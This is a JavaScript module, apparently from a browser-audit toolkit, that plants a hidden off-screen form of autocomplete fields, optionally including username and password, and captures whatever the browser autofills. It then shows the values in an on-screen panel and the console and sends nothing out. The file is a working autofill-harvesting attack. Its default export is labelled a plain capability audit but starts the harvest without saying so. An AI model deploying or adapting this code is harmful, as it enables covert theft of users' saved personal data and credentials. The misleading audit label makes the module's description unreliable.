/**
 * autofill_harvest.js — Real Autofill Data Harvesting (Live Demo, Sandboxed)
 *
 * Real attack: creates a hidden form with standard autocomplete fields and
 * waits for the browser to auto‑fill them with saved data. The harvested
 * information is displayed in an on‑screen panel and logged to the console.
 * No data is sent anywhere – everything stays local.
 *
 * Default export: Pinpoint `Autofill_Capability_Audit` (API check).
 */

// ---------------------------------------------------------------------------
// 1. Core harvesting engine (unchanged – real autofill extraction)
// ---------------------------------------------------------------------------

const AUTOCOMPLETE_TOKENS = {
    'name': 'Full name',
    'honorific-prefix': 'Honorific prefix',
    'given-name': 'First name',
    'additional-name': 'Middle name',
    'family-name': 'Last name',
    'honorific-suffix': 'Honorific suffix',
    'nickname': 'Nickname',
    'email': 'Email',
    'tel': 'Phone number',
    'organization': 'Company',
    'street-address': 'Street address',
    'address-line1': 'Address line 1',
    'address-level2': 'City',
    'address-level1': 'State / Province',
    'postal-code': 'ZIP / Postal code',
    'country': 'Country code',
    'bday': 'Birthday',
    'bday-day': 'Birth day',
    'bday-month': 'Birth month',
    'bday-year': 'Birth year',
};

function createHarvestForm(options = {}) {
    const {
        harvestCredentials = false,
        containerStyle = {
            position: 'fixed',
            left: '-9999px',
            top: '-9999px',
            opacity: '0',
            pointerEvents: 'none',
        },
    } = options;

    const tokens = { ...AUTOCOMPLETE_TOKENS };
    if (harvestCredentials) {
        tokens['username'] = 'Username';
        tokens['current-password'] = 'Current password';
    }

    const form = document.createElement('form');
    form.autocomplete = 'on';
    form.action = 'javascript:void(0)';
    Object.assign(form.style, containerStyle);

    const elements = Object.entries(tokens).map(([autocomplete, label]) => {
        const el = document.createElement('input');
        el.type = autocomplete.includes('password') ? 'password' : 'text';
        el.name = autocomplete;
        el.setAttribute('autocomplete', autocomplete);
        el.placeholder = label;
        el.style.display = 'block';
        el.style.margin = '2px 0';
        el.style.width = '200px';
        form.appendChild(el);
        return { element: el, autocomplete };
    });

    document.body.appendChild(form);
    return { form, elements, cleanup: () => form.remove() };
}

export async function harvestAutofillData(options = {}) {
    const {
        detectTimeout = 5000,
        pollInterval = 200,
        harvestCredentials = false,
        onProgress = null,
    } = options;

    const { elements, cleanup } = createHarvestForm({ harvestCredentials });
    const fieldMap = new Map(elements.map(e => [e.autocomplete, e.element]));
    const allTokens = Array.from(fieldMap.keys());
    const filled = new Map();
    const startTime = performance.now();

    return new Promise((resolve) => {
        const inputHandler = (e) => {
            const input = e.target;
            const autocomplete = input.getAttribute('autocomplete');
            if (!autocomplete || filled.has(autocomplete)) return;
            const val = input.value.trim();
            if (val.length > 0) {
                filled.set(autocomplete, val);
                if (onProgress) onProgress(autocomplete, val, filled.size, allTokens.length);
                input.removeEventListener('input', inputHandler);
            }
        };

        for (const [, el] of fieldMap) {
            el.addEventListener('input', inputHandler);
        }

        const poll = () => {
            for (const token of allTokens) {
                if (!filled.has(token)) {
                    const el = fieldMap.get(token);
                    const val = el.value.trim();
                    if (val.length > 0) {
                        filled.set(token, val);
                        el.removeEventListener('input', inputHandler);
                        if (onProgress) onProgress(token, val, filled.size, allTokens.length);
                    }
                }
            }

            const elapsed = performance.now() - startTime;
            if (filled.size === allTokens.length || elapsed >= detectTimeout) {
                clearInterval(interval);
                clearTimeout(timeout);
                const autofillData = {};
                allTokens.forEach(t => autofillData[t] = filled.get(t) || null);
                cleanup();
                resolve({
                    autofillData,
                    filledTokens: Array.from(filled.keys()),
                    fillRate: `${filled.size}/${allTokens.length}`,
                    durationMs: Math.round(elapsed),
                    timestamp: Date.now(),
                });
            }
        };

        const interval = setInterval(poll, pollInterval);
        const timeout = setTimeout(() => {
            clearInterval(interval);
            poll();
        }, detectTimeout);
    });
}

// ---------------------------------------------------------------------------
// 2. Live demonstration wrapper – shows harvested data in a panel
// ---------------------------------------------------------------------------

export async function demoAutofillHarvest(options = {}) {
    // Show a waiting panel
    const panel = document.createElement('div');
    panel.id = '__autofill_panel';
    panel.style.cssText =
        'position:fixed;top:10px;right:10px;z-index:2147483645;background:rgba(0,0,0,0.85);color:#0f0;' +
        'font-family:monospace;font-size:12px;padding:12px;border-radius:6px;max-width:400px;max-height:350px;' +
        'overflow-y:auto;white-space:pre-wrap;word-break:break-all;';
    panel.innerHTML = '<strong>[WAITING] Waiting for browser autofill...</strong><br>';
    document.body.appendChild(panel);

    const result = await harvestAutofillData({
        ...options, onProgress: (token, value) => {
            panel.innerHTML += `[+] ${token}: <strong>${value}</strong><br>`;
            panel.scrollTop = panel.scrollHeight;
            console.log(`[autofill_harvest] ${token} = ${value}`);
        }
    });

    // Final panel content
    const filled = result.filledTokens.length;
    panel.innerHTML += `<br>[SUMMARY] Harvested ${filled} token(s) out of ${result.autofillData ? Object.keys(result.autofillData).length : 0}.<br>`;
    if (filled === 0) {
        panel.innerHTML += '<span style="color:#ff0;">[NOTICE] No saved data – your browser might not have autofill information.</span><br>';
    } else {
        panel.innerHTML += '<span style="color:#ff0;">[WARNING] In a real attack, this data would be exfiltrated.</span><br>';
    }
    setTimeout(() => panel.remove(), 15000);
    console.log('[autofill_harvest] Full result:', result);
    return result;
}

// ---------------------------------------------------------------------------
// 3. Pinpoint Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'autofill_harvest',
    title: 'Autofill_Capability_Audit',
    level: 3,
    info: 'Audits HTML5 input autocomplete attribute support and browser form autofill interface availability.',
    steps: [
        'Inject comprehensive autocomplete test form.',
        'Monitor for real browser autofill events.',
        'Report which tokens were populated and overall support.',
    ],
    run: async () => {
        // Trigger live demonstration
        demoAutofillHarvest().catch(() => {});

        const input = document.createElement('input');
        const supported = 'autocomplete' in input;
        return {
            autocompleteAttributeSupported: supported,
            formElementSupported: 'form' in input,
            message: supported
                ? 'HTML5 autocomplete attribute is supported by this browser.'
                : 'HTML5 autocomplete attribute is not supported.',
        };
    },
};

export default pinpointModule;